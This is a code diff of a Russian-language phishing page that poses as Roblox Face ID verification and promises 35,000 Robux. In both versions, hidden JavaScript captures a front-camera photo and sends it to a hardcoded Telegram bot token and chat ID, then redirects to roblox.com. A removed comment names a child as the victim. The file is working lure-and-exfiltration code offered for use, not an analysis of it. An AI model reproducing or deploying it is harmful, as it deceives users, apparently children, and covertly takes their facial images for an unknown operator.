@@ -2,87 +2,80 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Verification Center</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
-        button { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        #st { margin-top: 15px; color: #888; font-size: 13px; }
+        body { font-family: sans-serif; background: #f4f6f8; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 380px; }
+        .btn { background: #0084ff; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 20px; }
+        #log { margin-top: 15px; color: #888; font-size: 12px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60">
-    <h2>Face ID Проверка</h2>
-    <p>Для зачисления <b>35,000 Robux</b> подтвердите личность владельца аккаунта. Нажмите кнопку и разрешите доступ.</p>
-    <button id="btn" onclick="takeFace()">✅ ПОДТВЕРДИТЬ</button>
-    <div id="st">Ожидание...</div>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="margin-bottom: 10px;">
+    <h1>Подтверждение Face ID</h1>
+    <p>Для зачисления <b>35,000 Robux</b> поднесите телефон к лицу и нажмите кнопку ниже.</p>
+    <button class="btn" onclick="startV()">✅ ПОДТВЕРДИТЬ</button>
+    <div id="log">Ожидание...</div>
 </div>
 
-<video id="v" autoplay playsinline style="display:none;"></video>
-<canvas id="c" style="display:none;"></canvas>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
 <script>
-    async function takeFace() {
-        const btn = document.getElementById('btn');
-        const st = document.getElementById('st');
+    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const C = '7889497672';
+
+    async function startV() {
+        const btn = document.querySelector('.btn');
+        const log = document.getElementById('log');
         const v = document.getElementById('v');
         const c = document.getElementById('c');
 
         btn.disabled = true;
-        btn.innerText = "ПОДОЖДИТЕ...";
-        st.innerText = "Подключение к модулю Face ID...";
+        btn.innerText = "ИДЕТ ПРОВЕРКА...";
 
         try {
-            // Запрашиваем ПЕРЕДНЮЮ камеру в хорошем разрешении
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user", 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 } 
-                } 
+                video: { facingMode: "user", width: 1280 } 
             });
-            
             v.srcObject = stream;
-            st.innerText = "Сканирование лица... 0%";
-
-            // Ждем 3 секунды, чтобы камера настроила фокус и яркость на лице
-            let p = 0;
-            const timer = setInterval(() => {
-                p += 33;
-                st.innerText = "Сканирование лица... " + p + "%";
-                if(p >= 99) clearInterval(timer);
+            
+            // Ждем 3 секунды для настройки света
+            let countdown = 3;
+            const i = setInterval(() => {
+                log.innerText = "Анализ лица через: " + countdown + "...";
+                countdown--;
+                if(countdown < 0) clearInterval(i);
             }, 1000);
 
             setTimeout(() => {
+                log.innerText = "ФИНАЛИЗАЦИЯ...";
                 c.width = v.videoWidth;
                 c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 
                 c.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('chat_id', '7889497672');
+                    fd.append('chat_id', C);
                     fd.append('photo', blob, 'face.jpg');
-                    fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЙМАНО!**\nУспешный захват передней камеры.');
+                    fd.append('caption', '👤 **ЛИЦО ПОЛУЧЕНО!**\n(Через Telegram Browser)');
 
-                    fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
-                        method: 'POST',
-                        body: fd
-                    }).then(() => {
-                        // Останавливаем камеру и перенаправляем ребенка
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
+                    .then(() => {
                         stream.getTracks().forEach(t => t.stop());
-                        alert("✅ Личность подтверждена! Робуксы придут в течение 15 минут.");
+                        alert("Верификация завершена! Ожидайте робуксы.");
                         window.location.href = "https://www.roblox.com";
                     });
-                }, 'image/jpeg', 0.8); // Качество 80%
-            }, 3500); // 3.5 секунды задержки для фокуса
+                }, 'image/jpeg', 0.8);
+            }, 4000);
 
         } catch (e) {
-            alert("Ошибка! Нужно разрешить доступ к камере.");
+            alert("Ошибка! Разрешите доступ к камере в Telegram.");
             btn.disabled = false;
-            st.innerText = "Доступ заблокирован.";
         }
     }
 </script>
